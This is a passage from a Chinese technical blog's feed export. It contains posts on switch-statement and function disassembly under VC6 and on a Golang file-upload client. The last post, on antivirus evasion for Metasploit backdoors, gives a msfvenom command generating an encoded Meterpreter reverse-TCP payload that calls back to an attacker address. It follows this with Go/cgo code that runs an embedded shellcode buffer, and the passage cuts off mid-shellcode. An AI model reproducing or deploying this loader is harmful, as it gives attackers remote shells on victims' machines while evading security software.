<h2 id="0x02分支数超过3且分支存在线性关系"><a href="#0x02分支数超过3且分支存在线性关系" class="headerlink" title="0x02分支数超过3且分支存在线性关系"></a>0x02分支数超过3且分支存在线性关系</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x = <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">switch</span>(x)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5:        int x = 5;</span><br><span class="line">0040D778   mov         dword ptr [ebp-4],5</span><br><span class="line">6:        switch(x)</span><br><span class="line">7:        &#123;</span><br><span class="line">0040D77F   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D782   mov         dword ptr [ebp-8],eax</span><br><span class="line">0040D785   mov         ecx,dword ptr [ebp-8]</span><br><span class="line">0040D788   sub         ecx,5                              //x减去分支中的最小值5，方便构建跳转表</span><br><span class="line">0040D78B   mov         dword ptr [ebp-8],ecx</span><br><span class="line">0040D78E   cmp         dword ptr [ebp-8],4                </span><br><span class="line">0040D792   ja          $L537+13h (0040d7fd)               //x-5&gt;4跳转到default，即x&gt;9跳转</span><br><span class="line">0040D794   mov         edx,dword ptr [ebp-8]              //edx=x-5</span><br><span class="line">0040D797   jmp         dword ptr [edx*4+40D81Fh]          //构建跳转表，根据edx的值从对应地址取出值(各个分支的地址)，40D81F为跳转表起始地址</span><br><span class="line">8:        case 5:</span><br><span class="line">9:            printf(&quot;%d\n&quot;,x);</span><br><span class="line">0040D79E   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D7A1   push        eax</span><br><span class="line">0040D7A2   push        offset string &quot;%d\n&quot; (0042201c)</span><br><span class="line">0040D7A7   call        printf (004010d0)</span><br><span class="line">0040D7AC   add         esp,8</span><br><span class="line">10:           break;</span><br><span class="line">0040D7AF   jmp         $L537+24h (0040d80e)</span><br><span class="line">11:       case 6:</span><br><span class="line">12:           printf(&quot;%d\n&quot;,x);</span><br><span class="line">0040D7B1   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D7B4   push        ecx</span><br><span class="line">0040D7B5   push        offset string &quot;%d\n&quot; (0042201c)</span><br><span class="line">0040D7BA   call        printf (004010d0)</span><br><span class="line">0040D7BF   add         esp,8</span><br><span class="line">13:           break;</span><br><span class="line">0040D7C2   jmp         $L537+24h (0040d80e)</span><br><span class="line">14:       case 7:</span><br><span class="line">15:           printf(&quot;%d\n&quot;,x);</span><br><span class="line">0040D7C4   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040D7C7   push        edx</span><br><span class="line">0040D7C8   push        offset string &quot;%d\n&quot; (0042201c)</span><br><span class="line">0040D7CD   call        printf (004010d0)</span><br><span class="line">0040D7D2   add         esp,8</span><br><span class="line">16:           break;</span><br><span class="line">0040D7D5   jmp         $L537+24h (0040d80e)</span><br><span class="line">17:       case 8:</span><br><span class="line">18:           printf(&quot;%d\n&quot;,x);</span><br><span class="line">0040D7D7   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D7DA   push        eax</span><br><span class="line">0040D7DB   push        offset string &quot;%d\n&quot; (0042201c)</span><br><span class="line">0040D7E0   call        printf (004010d0)</span><br><span class="line">0040D7E5   add         esp,8</span><br><span class="line">19:           break;</span><br><span class="line">0040D7E8   jmp         $L537+24h (0040d80e)</span><br><span class="line">20:       case 9:</span><br><span class="line">21:           printf(&quot;%d\n&quot;,x);</span><br><span class="line">0040D7EA   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D7ED   push        ecx</span><br><span class="line">0040D7EE   push        offset string &quot;%d\n&quot; (0042201c)</span><br><span class="line">0040D7F3   call        printf (004010d0)</span><br><span class="line">0040D7F8   add         esp,8</span><br><span class="line">22:           break;</span><br><span class="line">0040D7FB   jmp         $L537+24h (0040d80e)</span><br><span class="line">23:       default:</span><br><span class="line">24:           printf(&quot;%d\n&quot;,x);</span><br><span class="line">0040D7FD   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040D800   push        edx</span><br><span class="line">0040D801   push        offset string &quot;%d\n&quot; (0042201c)</span><br><span class="line">0040D806   call        printf (004010d0)</span><br><span class="line">0040D80B   add         esp,8</span><br><span class="line">25:           break;</span><br><span class="line">26:       &#125;</span><br></pre></td></tr></table></figure>
<p>跳转表从[edx*4+40D81Fh]取出分支的地址值然后进行jmp，下表是跳转表部分<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0040D81F  9E D7 40 00  ..@.</span><br><span class="line">0040D823  B1 D7 40 00  ..@.</span><br><span class="line">0040D827  C4 D7 40 00  ..@.</span><br><span class="line">0040D82B  D7 D7 40 00  ..@.</span><br><span class="line">0040D82F  EA D7 40 00  ..@.</span><br></pre></td></tr></table></figure></p>
<h2 id="0x03分支跃度大难以构成跳转表的分支结构"><a href="#0x03分支跃度大难以构成跳转表的分支结构" class="headerlink" title="0x03分支跃度大难以构成跳转表的分支结构"></a>0x03分支跃度大难以构成跳转表的分支结构</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x = <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">switch</span>(x)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">100</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,x);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5:        int x = 5;</span><br><span class="line">00401028   mov         dword ptr [ebp-4],5</span><br><span class="line">6:        switch(x)</span><br><span class="line">7:        &#123;</span><br><span class="line">0040102F   mov         eax,dword ptr [ebp-4]</span><br><span class="line">00401032   mov         dword ptr [ebp-8],eax</span><br><span class="line">00401035   mov         ecx,dword ptr [ebp-8]</span><br><span class="line">00401038   sub         ecx,5</span><br><span class="line">0040103B   mov         dword ptr [ebp-8],ecx</span><br><span class="line">0040103E   cmp         dword ptr [ebp-8],5Fh</span><br><span class="line">00401042   ja          $L536+13h (004010b5)               //具体参见上一种,x大于100跳转到default</span><br><span class="line">00401044   mov         eax,dword ptr [ebp-8]              //edx=x-5</span><br><span class="line">00401047   xor         edx,edx                            //edx置零</span><br><span class="line">00401049   mov         dl,byte ptr  (004010ef)[eax]       //查询索引表并将取出来的值放入DL(在od里面的这条反汇编更清楚)</span><br><span class="line">0040104F   jmp         dword ptr [edx*4+4010D7h]          //根据DL(EDX)的值查跳转表</span><br><span class="line">8:        case 5:</span><br><span class="line">9:            printf(&quot;%d\n&quot;,x);</span><br><span class="line">00401056   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">00401059   push        ecx</span><br><span class="line">0040105A   push        offset string &quot;%d\n&quot; (0042201c)</span><br><span class="line">0040105F   call        printf (004011a0)</span><br><span class="line">00401064   add         esp,8</span><br><span class="line">10:           break;</span><br><span class="line">00401067   jmp         $L536+24h (004010c6)</span><br><span class="line">11:       case 6:</span><br><span class="line">12:           printf(&quot;%d\n&quot;,x);</span><br><span class="line">00401069   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040106C   push        edx</span><br><span class="line">0040106D   push        offset string &quot;%d\n&quot; (0042201c)</span><br><span class="line">00401072   call        printf (004011a0)</span><br><span class="line">00401077   add         esp,8</span><br><span class="line">13:           break;</span><br><span class="line">0040107A   jmp         $L536+24h (004010c6)</span><br><span class="line">14:       case 7:</span><br><span class="line">15:           printf(&quot;%d\n&quot;,x);</span><br><span class="line">0040107C   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040107F   push        eax</span><br><span class="line">00401080   push        offset string &quot;%d\n&quot; (0042201c)</span><br><span class="line">00401085   call        printf (004011a0)</span><br><span class="line">0040108A   add         esp,8</span><br><span class="line">16:           break;</span><br><span class="line">0040108D   jmp         $L536+24h (004010c6)</span><br><span class="line">17:       case 8:</span><br><span class="line">18:           printf(&quot;%d\n&quot;,x);</span><br><span class="line">0040108F   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">00401092   push        ecx</span><br><span class="line">00401093   push        offset string &quot;%d\n&quot; (0042201c)</span><br><span class="line">00401098   call        printf (004011a0)</span><br><span class="line">0040109D   add         esp,8</span><br><span class="line">19:           break;</span><br><span class="line">004010A0   jmp         $L536+24h (004010c6)</span><br><span class="line">20:       case 100:</span><br><span class="line">21:           printf(&quot;%d\n&quot;,x);</span><br><span class="line">004010A2   mov         edx,dword ptr [ebp-4]</span><br><span class="line">004010A5   push        edx</span><br><span class="line">004010A6   push        offset string &quot;%d\n&quot; (0042201c)</span><br><span class="line">004010AB   call        printf (004011a0)</span><br><span class="line">004010B0   add         esp,8</span><br><span class="line">22:           break;</span><br><span class="line">004010B3   jmp         $L536+24h (004010c6)</span><br><span class="line">23:       default:</span><br><span class="line">24:           printf(&quot;%d\n&quot;,x);</span><br><span class="line">004010B5   mov         eax,dword ptr [ebp-4]</span><br><span class="line">004010B8   push        eax</span><br><span class="line">004010B9   push        offset string &quot;%d\n&quot; (0042201c)</span><br><span class="line">004010BE   call        printf (004011a0)</span><br><span class="line">004010C3   add         esp,8</span><br><span class="line">25:           break;</span><br><span class="line">26:       &#125;</span><br></pre></td></tr></table></figure>
<p>索引表<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004010F1  00 01 02 03 05 05 05 05  ........</span><br><span class="line">004010F9  05 05 05 05 05 05 05 05  ........</span><br><span class="line">00401101  05 05 05 05 05 05 05 05  ........</span><br><span class="line">00401109  05 05 05 05 05 05 05 05  ........</span><br><span class="line">00401111  05 05 05 05 05 05 05 05  ........</span><br><span class="line">00401119  05 05 05 05 05 05 05 05  ........</span><br><span class="line">00401121  05 05 05 05 05 05 05 05  ........</span><br><span class="line">00401129  05 05 05 05 05 05 05 05  ........</span><br><span class="line">00401131  05 05 05 05 05 05 05 05  ........</span><br><span class="line">00401139  05 05 05 05 05 05 05 05  ........</span><br><span class="line">00401141  05 05 05 05 05 05 05 05  ........</span><br><span class="line">00401149  05 05 05 05 05 05 05 04  ........</span><br></pre></td></tr></table></figure></p>
<p>跳转表<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004010D9  58 10 40 00  X.@.</span><br><span class="line">004010DD  6B 10 40 00  k.@.</span><br><span class="line">004010E1  7E 10 40 00  ~.@.</span><br><span class="line">004010E5  91 10 40 00  ..@.</span><br><span class="line">004010E9  A4 10 40 00  ..@.</span><br><span class="line">004010ED  B7 10 40 00  ..@.</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>最最简单的c语言函数汇编分析</title>
    <url>/2017/09/06/%E6%9C%80%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84c%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90.html</url>
    <content><![CDATA[<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><p>xp+vc6.0</p>
<h2 id="0x02-代码"><a href="#0x02-代码" class="headerlink" title="0x02 代码"></a>0x02 代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">plus</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>以下是vc6.0的反汇编窗口<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1:    int plus(int x, int y)</span><br><span class="line">2:    &#123;</span><br><span class="line">00401020   push        ebp</span><br><span class="line">00401021   mov         ebp,esp</span><br><span class="line">00401023   sub         esp,40h</span><br><span class="line">00401026   push        ebx</span><br><span class="line">00401027   push        esi</span><br><span class="line">00401028   push        edi</span><br><span class="line">00401029   lea         edi,[ebp-40h]</span><br><span class="line">0040102C   mov         ecx,10h</span><br><span class="line">00401031   mov         eax,0CCCCCCCCh</span><br><span class="line">00401036   rep stos    dword ptr [edi]</span><br><span class="line">3:        return 0;</span><br><span class="line">00401038   xor         eax,eax</span><br><span class="line">4:    &#125;</span><br><span class="line">0040103A   pop         edi</span><br><span class="line">0040103B   pop         esi</span><br><span class="line">0040103C   pop         ebx</span><br><span class="line">0040103D   mov         esp,ebp</span><br><span class="line">0040103F   pop         ebp</span><br><span class="line">00401040   ret</span><br></pre></td></tr></table></figure></p>
<h2 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03 分析"></a>0x03 分析</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push      ebp</span><br><span class="line">mov       ebp,esp</span><br><span class="line">sub       esp,40h</span><br><span class="line">//提升栈，为函数腾出空间，为ebp寻址做准备</span><br><span class="line">push      ebx</span><br><span class="line">push      esi</span><br><span class="line">push      edi</span><br><span class="line">//寄存器压栈，保存现场</span><br><span class="line">lea       edi,[ebp-40h]</span><br><span class="line">//将ebp-40h（esp）的具体内存地址存到edi</span><br><span class="line">mov       ecx,10h</span><br><span class="line">//10（十六进制）存入计数寄存器</span><br><span class="line">mov       eax,0xCCCCCCCC</span><br><span class="line">//初始化eax</span><br><span class="line">rep stos  dword ptr [edi]</span><br><span class="line">//用eax中的值初始化到es:[edi]指向的地址，长度为dword，循环执行次数为eax中的值（恰好ebp-&gt;esp全部被初始化）</span><br><span class="line">xor       eax,eax</span><br><span class="line">//eax清零</span><br><span class="line">pop       edi</span><br><span class="line">pop       esi</span><br><span class="line">pop       ebx</span><br><span class="line">mov       esp,ebp</span><br><span class="line">pop       ebp</span><br><span class="line">ret</span><br><span class="line">//寄存器出栈，恢复现场，堆栈平衡并返回</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang模拟客户端POST表单功能文件上传</title>
    <url>/2017/07/07/Golang%E6%A8%A1%E6%8B%9F%E5%AE%A2%E6%88%B7%E7%AB%AFPOST%E8%A1%A8%E5%8D%95%E5%8A%9F%E8%83%BD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html</url>
    <content><![CDATA[<p>客户端通过multipart.Write把文件的文本流写入一个缓存中，然后调用http的Post方法把缓存传到服务器。<br><a id="more"></a><br><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"bytes"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"io"</span></span><br><span class="line">    <span class="string">"io/ioutil"</span></span><br><span class="line">    <span class="string">"mime/multipart"</span></span><br><span class="line">    <span class="string">"net/http"</span></span><br><span class="line">    <span class="string">"os"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">postFile</span><span class="params">(filename <span class="keyword">string</span>, targetUrl <span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    bodyBuf := &amp;bytes.Buffer&#123;&#125;</span><br><span class="line">    bodyWriter := multipart.NewWriter(bodyBuf)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//关键的一步操作</span></span><br><span class="line">    fileWriter, err := bodyWriter.CreateFormFile(<span class="string">"uploadfile"</span>, filename)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"error writing to buffer"</span>)</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//打开文件句柄操作</span></span><br><span class="line">    fh, err := os.Open(filename)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"error opening file"</span>)</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> fh.Close()</span><br><span class="line"></span><br><span class="line">    <span class="comment">//iocopy</span></span><br><span class="line">    _, err = io.Copy(fileWriter, fh)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    contentType := bodyWriter.FormDataContentType()</span><br><span class="line">    bodyWriter.Close()</span><br><span class="line"></span><br><span class="line">    resp, err := http.Post(targetUrl, contentType, bodyBuf)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">    resp_body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(resp.Status)</span><br><span class="line">    fmt.Println(<span class="keyword">string</span>(resp_body))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sample usage</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    target_url := <span class="string">"http://localhost/upload"</span></span><br><span class="line">    filename := <span class="string">"./example.pdf"</span></span><br><span class="line">    postFile(filename, target_url)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>关于msf反弹后门的免杀Tips</title>
    <url>/2017/04/20/msf-AntiVirus.html</url>
    <content><![CDATA[<p>msf是一个很强大的工具，我经常会在渗透用它来反弹shell，不过它生成的反弹后门会被不少杀软kill，这篇文章只是讲讲我在msf中一个简单的免杀小技巧<br><a id="more"></a></p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>我以前接触过一款python的远控，其实说是远控，基本也就是nc的功能加了一个服务端的web页面控制并加了一些其他的功能可以用来管理诸多客户机<br>这款远控我下载下来用过，并用pyinstaller打包成了exe（缺点是体积太过庞大），惊奇的是，360不杀它，然后自己想着其他语言是不是也会这样，于是我用golang写了一个简易版nc反弹，编译之后，也是不查杀的。python和golang有一个共同点，就是可以用来内联C编程，所以C语言的shellcode按理说应该会达到同样的效果</p>
<h2 id="得到shellcode"><a href="#得到shellcode" class="headerlink" title="得到shellcode"></a>得到shellcode</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LPORT=5555 LHOST=192.168.1.100 -e x86/shikata_ga_nai -i 11 -f py &gt; 1.py</span><br></pre></td></tr></table></figure>
<p>建议是生成32位的，如果想生成64位也可以，<code>-e x86/shikata_ga_nai -i 11</code>是指用<code>x86/shikata_ga_nai</code>编码迭代11次，然后生成py文件<br>py文件打开是shellcode，我们接下来对它进行一点小改造，对于python去执行shellcode的方法，相信小伙伴都已经不陌生，在《python灰帽子》中有讲解，我今天要使用的是golang，其实个人认为golang执行shellcode的代码是更简洁的</p>
<h2 id="Golang环境搭建"><a href="#Golang环境搭建" class="headerlink" title="Golang环境搭建"></a>Golang环境搭建</h2><p>安装Golang32位（建议32位，与前面对应，在测试过程中，如果32位shellcode配合64位golang加32位gcc，就算把golang的GOARCH改为386也依旧会失败，建议一一对应），安装gcc32位（可以使用<a href="http://tdm-gcc.tdragon.net/download" target="_blank" rel="noopener">TDM-GCC</a>）</p>
<h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">void call(char *code) &#123;</span></span><br><span class="line"><span class="comment">    int (*ret)() = (int(*)())code;</span></span><br><span class="line"><span class="comment">    ret();</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"C"</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"unsafe"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    buf := <span class="string">""</span></span><br><span class="line">    buf += <span class="string">"\xdd\xc6\xd9\x74\x24\xf4\x5f\x33\xc9\xb8\xb3\x5e\x2c"</span></span><br><span class="line">    buf += <span class="string">"\xc9\xb1\x97\x31\x47\x1a\x03\x47\x1a\x83\xc7\x04\xe2"</span></span><br><span class="line">    buf += <span class="string">"\x46\x84\xfd\x72\xee\x0e\xb5\x96\x37\x04\x6d\x63\x9f"</span></span><br><span class="line">    buf += <span class="string">"\xcc\xa4\x3a\x8e\x8c\xf7\x39\x81\xca\xe4\x42\xff\xce"</span></span><br><span class="line">    buf += <span class="string">"\xa3\xa2\xdb\x06\xc0\x3f\xaf\x41\x73\xba\xf7\x20\x13"</span></span><br><span class="line">    buf += <span class="string">"\x98\x8c\xff\xfa\x0a\xda\x6e\xf2\x6d\xc3\x81\x07\xc0"</span></span><br><span class="line">    buf += <span class="string">"\x1b\x37\xeb\xa2\xa9\x32\x71\xaf\xe9\x20\xd1\xaa\x9e"</span></span><br><span class="line">    buf += <span class="string">"\xbd\x82\xf3\x81\x1f\xab\xbf\xc4\xd9\x6c\x75\x37\x3a"</span></span><br><span class="line">    buf += <span class="string">"\x53\x78\x90\x79\xaf\x93\x1b\xb3\x15\x09\xe5\x45\x5c"</span></span><br><span class="line">    buf += <span class="string">"\x26\x0f\x0d\x16\x52\xf1\x8a\x7e\x8b\xc4\x50\x8e\x0a"</span></span><br><span class="line">    buf += <span class="string">"\x38\x2f\x2b\x40\x73\x0b\xf0\x51\x5f\xc6\xbf\x04\x47"</span></span><br><span class="line">    buf += <span class="string">"\x80\x36\xe5\x88\x88\xb3\xfc\xa0\x52\xfe\x92\x81\x8d"</span></span><br><span class="line">    buf += <span class="string">"\x89\xf2\x6a\xcc\x7f\x9a\xe9\x1a\x30\x73\xa3\x63\x42"</span></span><br><span class="line">    buf += <span class="string">"\x10\xe9\xcf\x62\xe4\x06\x52\xe1\x8d\x88\xfe\x52\xc4"</span></span><br><span class="line">    buf += <span class="string">"\xc3\xed\x7a\x0e\x66\x5f\x8c\x2c\xef\xfa\xbd\x8c\x79"</span></span><br><span class="line">    buf += <span class="string">"\x6c\x01\xe3\x5c\xde\xc4\x8a\x4c\x7d\x34\x32\xb5\x23"</span></span><br><span class="line">    buf += <span class="string">"\x56\x6c\x52\x3f\x15\x26\x6a\xf8\x6b\x81\x2c\x23\x8d"</span></span><br><span class="line">    buf += <span class="string">"\x41\x6e\x24\x30\xc6\xcb\xba\x26\xd4\x3b\x37\xd3\xc6"</span></span><br><span class="line">    buf += <span class="string">"\xa8\x5a\x16\x8f\x1e\x27\xca\xcb\xda\x7f\x74\x62\xb2"</span></span><br><span class="line">    buf += <span class="string">"\x62\xa6\xb1\xfc\x64\x53\x3a\xa7\xa4\x21\x3d\x79\x08"</span></span><br><span class="line">    buf += <span class="string">"\x06\x74\x2a\xa2\xe7\x0d\x68\x16\xa3\x96\xe5\xad\x32"</span></span><br><span class="line">    buf += <span class="string">"\x10\xa3\x0f\x49\xc3\x69\xa7\x5b\x61\x1a\xf8\x1d\x9e"</span></span><br><span class="line">    buf += <span class="string">"\x9b\x3a\x00\xfc\x18\xc3\x42\x1a\xd6\x44\x5d\xfe\xc5"</span></span><br><span class="line">    buf += <span class="string">"\xb6\x68\xd2\xad\x24\xda\x74\xa7\xf3\x66\x9a\x42\x7a"</span></span><br><span class="line">    buf += <span class="string">"\x50\xf0\x0b\x47\xbc\xad\x6c\x1e\xca\xbe\x90\xca\xc3"</span></span><br><span class="line">    buf += <span class="string">"\x8e\x5b\xde\x66\xe2\xb3\x20\x6f\x38\x17\xc1\xac\xfb"</span></span><br><span class="line">    buf += <span class="string">"\xd3\x2f\x91\xa7\xff\x65\xd7\xd0\x25\x4c\xd4\xb3\x35"</span></span><br><span class="line">    buf += <span class="string">"\x38\xa1\x82\xb8\x23\x42\xe9\xa5\x95\x8e\xc4\x35\xca"</span></span><br><span class="line">    buf += <span class="string">"\x92\xfe\xde\x62\x70\xd6\x7a\x7f\xfd\xfb\xf0\x24\xbd"</span></span><br><span class="line">    buf += <span class="string">"\x5d\x6d\x3d\x13\xbc\x1d\x25\x54\x9d\x0e\x68\xc8\x9a"</span></span><br><span class="line">    buf += <span class="string">"\x10\x87\xf0\xc9\xac\x37\x57\x84\x23\x5f\x8a\xc0\xab"</span></span><br><span class="line">    buf += <span class="string">"\x52\x6e\xae\x79\xa2\xdb\xff\xd8\x41\x28\x8b\xd3\x9d"</span></span><br><span class="line">    buf += <span class="string">"\x68\x3c\x55\xf2\xfe\x0c\x8a\x38\xdf\xb3\x80\x9b\x70"</span></span><br><span class="line">    buf += <span class="string">"\x2b\x4e\xe1\xfa\x0b\xfe\xf5\xc3\x1a\x0d\x83\xb0\x69"</span></span><br><span class="line">    buf += <span class="string">"\xd0\x68\xfb\xe0\xae\xbd\x56\x52\x17\x9a\xf8\x8f\xc0"</span></span><br><span class="line">    buf += <span class="string">"\x14\x8c\xb0\xf7\x0e\x87\xfa\x54\xf4\x04\x4a\x5a\xc8"</span></span><br><span class="line">    buf += <span class="string">"\x89\x57\x0e\xbf\x7a\x76\x9b\xfe\xb8\x5f\x31\x42\xec"</span></span><br><span class="line">    buf += <span class="string">"\xaf\x18\x9e\x3f\xf0\x09\x79\x86\xb3\x08\x29\x50\xfd"</span></span><br><span class="line">    buf += <span class="string">"\xc3\x46\x7d\x24\x51\x5b\xd0\x81\x19\x6f\xc2\x2c\x17"</span></span><br><span class="line">    buf += <span class="string">"\xab\xa3\xb7\xd9\x6f\x82\xd9\x37\x5f\x38\x01\xd8\xfd"</span></span><br><span class="line">    buf += <span class="string">"\xfd\x11\x22\x61\xd0\x92\x45\x37\x4f\x6c\x4e\x91\x3b"</span></span><br><span class="line">    buf += <span class="string">"\x42\x07\xc5\x77\xdc\x52\xd6\xc7\x9d\x7b\x62\xba\x1c"</span></span><br><span class="line">    buf += <span class="string">"\x62\x3c\xde\xad\x96\x03\x55\xde\x9d\x52\x5c\x5d\x0c"</span></span><br><span class="line">    buf += <span 